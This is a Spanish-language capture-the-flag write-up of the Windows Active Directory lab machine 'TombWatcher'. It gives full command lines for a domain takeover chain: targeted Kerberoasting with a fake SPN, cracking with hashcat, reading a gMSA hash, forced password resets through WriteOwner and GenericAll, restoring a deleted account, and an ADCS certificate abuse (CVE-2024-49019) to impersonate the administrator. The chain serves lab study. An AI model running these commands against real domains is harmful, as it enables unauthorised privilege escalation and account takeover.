# Máquina: TombWatcher

- **Sistema Operativo:** Windows
- **Dificultad:** Media
- **Técnicas clave:** Active Directory, LDAP Enumeration, SMB, PrivEsc

---

![Pasted image 20260705115544.png](assets/Pasted%20image%2020260705115544.png)

Como es común en las pruebas de penetración de Windows de la vida real, iniciará el cuadro TombWatcher con credenciales para la siguiente cuenta: henry / H3nry_987TGV!

![Pasted image 20260705121316.png](assets/Pasted%20image%2020260705121316.png)

comando:

```
sudo nmap -sVC --min-rate 5000 -n -Pn -p- --open -sS 10.129.232.167 -oN escaneo
```

![Pasted image 20260705122457.png](assets/Pasted%20image%2020260705122457.png)

se guarda etc/hosts

miramos res cursos del usuario y tiene todos los normales ![Pasted image 20260705123203.png](assets/Pasted%20image%2020260705123203.png)

comando: 

```
nxc smb 10.129.232.167 -u henry -p H3nry_987TGV! --shares
```

nos descargamos la condi del ad para blood podemos usar dos notas siempre mirar diferentes coleptores

comando:

```
bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' get bloodhound
```

```
bloodhound-ce-python -u alfred -p 'basketball' -d tombwatcher.htb -dc dc01.tombwatcher.htb -ns 10.129.232.167 -c All --zip
```

![Pasted image 20260705123812.png](assets/Pasted%20image%2020260705123812.png)

![Pasted image 20260705233529.png](assets/Pasted%20image%2020260705233529.png)

le blood nos dise que henry tiene writesspn sobre el usuario alfred

![Pasted image 20260705125100.png](assets/Pasted%20image%2020260705125100.png)

pero que es esto:

El abuso de `WriteSPN` se llama **Targeted Kerberoasting** (Kerberoasting dirigido). Te explico bien cómo funciona y por qué es tan efectivo:

**¿Qué es normalmente el Kerberoasting?**  
En un dominio AD, cualquier usuario autenticado puede pedir un ticket de servicio (TGS) para cualquier cuenta que tenga un SPN (Service Principal Name) configurado. Ese ticket viene cifrado con el hash de la contraseña de la cuenta de servicio. Si lográs ese ticket, te lo llevás a crackear offline con `hashcat` tratando de adivinar la contraseña.

**El problema del Kerberoasting clásico:**  
Solo funciona sobre cuentas que YA tienen un SPN configurado (típicamente cuentas de servicio con contraseñas viejas y débiles). Si `alfred` no tiene ningún SPN, normalmente no podrías kerberoastear su cuenta.

**Acá está la clave del abuso:**  
Vos (`henry`) tenés el permiso `WriteSPN` sobre `alfred`, es decir, **podés escribirle un SPN falso** aunque `alfred` no sea una cuenta de servicio. Una vez que le agregás ese SPN:

1. El dominio ahora "cree" que `alfred` es una cuenta de servicio
2. Podés pedir un ticket TGS para ese SPN falso
3. Ese ticket viene cifrado con el hash NTLM de la contraseña de `alfred`
4. Te lo llevás y lo crackeás offline

En resumen: **convertís a cualquier usuario en "kerberoasteable" con solo tener ese permiso**, sin importar si tenía o no un SPN antes. Es un método muy directo para pasar de tu usuario `henry` a comprometer `alfred`.

**Los pasos técnicos** ya te los pasé arriba (agregar el SPN con bloodyAD, después pedir el ticket con `GetUserSPNs.py -request`, después crackear con hashcat modo `13100`).

ya teniendo esto en cuenta se agrega un spn falso![Pasted image 20260705134201.png](assets/Pasted%20image%2020260705134201.png)

comando:

```
bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' set object alfred servicePrincipalName -v 'hackx/legit'
```

luego se Pide  el ticket TGS de ese SPN falso

comando: 

```
GetUserSPNs.py tombwatcher.htb/henry:'H3nry_987TGV!' -dc-ip 10.129.232.167 -request
```

![Pasted image 20260705174929.png](assets/Pasted%20image%2020260705174929.png)

lo guardamos en un archivo![Pasted image 20260705175125.png](assets/Pasted%20image%2020260705175125.png)

comando:

```
GetUserSPNs.py tombwatcher.htb/henry:'H3nry_987TGV!' -dc-ip 10.129.232.167 -request -outputfile alfred.kerberoast
```

luego lo rompemos con hascat 

comando:  

```
hashcat -m 13100 alfred.kerberoast /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
```

![Pasted image 20260705180354.png](assets/Pasted%20image%2020260705180354.png)

la pass: basketball

![Pasted image 20260705180805.png](assets/Pasted%20image%2020260705180805.png)

tambien enumerando en contre la cuenta para la cual los miembros del grupo INFRAESTRUCTURA pueden leer la contraseña de gMSA![Pasted image 20260705220124.png](assets/Pasted%20image%2020260705220124.png)

comando:
```
bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'alfred' -p 'basketball' get search --filter '(objectClass=msDS-GroupManagedServiceAccount)' --attr sAMAccountName,msDS-GroupMSAMembership --resolve-sd
```

![Pasted image 20260705220457.png](assets/Pasted%20image%2020260705220457.png)

pero aun no tenemos abseso a ese grupo pero enumerado miramos que al fred se puede agregar al grupo ingre estructure

![Pasted image 20260705221653.png](assets/Pasted%20image%2020260705221653.png)
comando:

```
bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'alfred' -p 'basketball' get object 'Infrastructure' --attr member
```

asi que nos agregamos al grupo infra estructure

![Pasted image 20260705222134.png](assets/Pasted%20image%2020260705222134.png)

comando: 

```
bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'alfred' -p 'basketball' add groupMember Infrastructure alfred
```

para confirmar mejor asemos esto u sacamos los hash ntlm dela cuenta de maquina 

![Pasted image 20260705224823.png](assets/Pasted%20image%2020260705224823.png)

comando:

```
bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'alfred' -p 'basketball' -v DEBUG add groupMember Infrastructure alfred
```

```
nxc ldap 10.129.232.167 -u alfred -p basketball --gmsa
```

ya con el hash dela cuenta de maquina esta tiene la cambiamos la pass a sam 

![Pasted image 20260705225934.png](assets/Pasted%20image%2020260705225934.png)

![Pasted image 20260705234118.png](assets/Pasted%20image%2020260705234118.png)
comandos:

```
bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'ansible_dev$' -p ':b91f529d36292ba764273e5dd7b90fa1' set password sam 'pepe123'
```

```
nxc smb 10.129.232.167 -u 'sam' -p 'pepe123'
```

![Pasted image 20260705234423.png](assets/Pasted%20image%2020260705234423.png)

sam tiene writeOwner sobre john que es esto :

En Active Directory, **WriteOwner** es un permiso de control de acceso (ACE) que permite a un usuario o grupo **cambiar la propiedad (dueño) de un objeto**. 

**Puntos clave:**

- **Capacidad de toma de control:** Al ser el propietario de un objeto, se tiene el derecho de modificar su lista de control de acceso (DACL), lo que permite otorgarse a sí mismo control total sobre ese objeto, incluso sin tener permisos explícitos previos. 
    
- **Riesgo de seguridad:** Este permiso es crítico para la escalación de privilegios. Si un atacante obtiene **WriteOwner** sobre un grupo privilegiado (como _Domain Admins_), puede cambiar la propiedad del grupo a su cuenta y luego modificar los permisos para añadirse al mismo. 
    
- **Diferencia con otras propiedades:** No debe confundirse con la propiedad `owner` estándar (visible en el descriptor de seguridad); **WriteOwner** es el permiso específico que autoriza la modificación de dicha propiedad. 
    

sabiendo est prosedemos con el abuso primero cambiamos el dueño de ese objeto de `Domain Admins` a `sam`.

comando:

```
owneredit.py -action write -target john -new-owner sam 'tombwatcher.htb/sam:pepe123' -dc-ip 10.129.232.167
```

![Pasted image 20260706000859.png](assets/Pasted%20image%2020260706000859.png)

Siguiente paso — otorgarnos GenericAll y cambiar la pass de john

comandos:

```
bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'sam' -p 'pepe123' add genericAll john sam
```

```
bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u 'sam' -p 'pepe123' set password john 'pepe1234'
```

![Pasted image 20260706001220.png](assets/Pasted%20image%2020260706001220.png)
![Pasted image 20260706001420.png](assets/Pasted%20image%2020260706001420.png)

ya sabiendo esto nos conectamos por winrm con este usuario 

comando: 

```
evil-winrm -i 10.129.232.167 -u 'john' -p 'pepe1234'
```

![Pasted image 20260706002458.png](assets/Pasted%20image%2020260706002458.png)

sacamos user.txt

`1afd34fc6f25c5c746d813acd0a7c273`

luego de enumerar  encontramos esto 
![Pasted image 20260706005129.png](assets/Pasted%20image%2020260706005129.png)

se SID (...-1111) es justo el que Certipy no pudo resolver a un nombre (fijate arriba en el log: [!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'). Esto confirma la teoría del nombre "TombWatcher" — es una cuenta eliminada de AD que sigue teniendo permisos de enrollment residuales sobre ese template, y probablemente tengas que recuperarla del AD Recycle Bin para poder usarla.

asi que prosedemos a mirar cuentas eliminadas y en contramos lo siguiente![Pasted image 20260706005509.png](assets/Pasted%20image%2020260706005509.png)

luego busamos y ese temaplate tiene un cve que ase dicho cve CVE-2024-49019) 

El template `WebServer` tiene **Schema Version 1** y `Enrollee Supplies Subject: True`, pero solo declara `Extended Key Usage: Server Authentication` (no Client Authentication). En certificados de Schema V1, Windows no aplica una restricción estricta sobre las Application Policies — un solicitante puede **inyectar manualmente una Application Policy de "Client Authentication"** al pedir el certificado, aunque el template no la tenga configurada. Eso permite usar un certificado pensado para servidores como si fuera de autenticación de cliente, y autenticarte como cualquier usuario (en este caso, `administrator@tombwatcher.htb`).

sabiendo esto restauramos la cuenta 

comandos:

```
Get-ADObject -Filter {objectGUID -eq '938182c3-bf0b-410a-9aaa-45c8e1a02ebf'} -IncludeDeletedObjects | Restore-ADObject
```

cuenta restaurada luego se habilita la cuenta 

```
Enable-ADAccount -Identity cert_admin
```

cuenta habilitada luego se cambia la pass 

```
Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "NuevaPass789!" -AsPlainText -Force)
```

se confirma que quedo bien todo

```
Get-ADUser cert_admin
```

![Pasted image 20260706010355.png](assets/Pasted%20image%2020260706010355.png)

ya luego pedimos un certificado valido 

```
certipy req -u cert_admin -p 'NuevaPass789!' -dc-ip 10.129.232.167 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Client Authentication'
```

![Pasted image 20260706010643.png](assets/Pasted%20image%2020260706010643.png)

nota impotante esto lo yse en un contenedor de doker por que tenia problemas de dependencia 

```
certipy-ad auth -pfx /administrator.pfx -dc-ip 10.129.232.167 -ldap-shell
Certipy v5.1.0 - by Oliver Lyak (ly4k)
```

luego sele cambia la pass al usuario 

```
change_password administrator NewPass0rd!
```

![Pasted image 20260706022115.png](assets/Pasted%20image%2020260706022115.png)

ya nos conectamos por evil con  este usuario y su pass 

```
evil-winrm -i 10.129.232.167 -u administrator -p 'NewPass0rd!'
```

y sacamos root.txt![Pasted image 20260706022225.png](assets/Pasted%20image%2020260706022225.png)

![Pasted image 20260712190728.png](assets/Pasted%20image%2020260712190728.png)

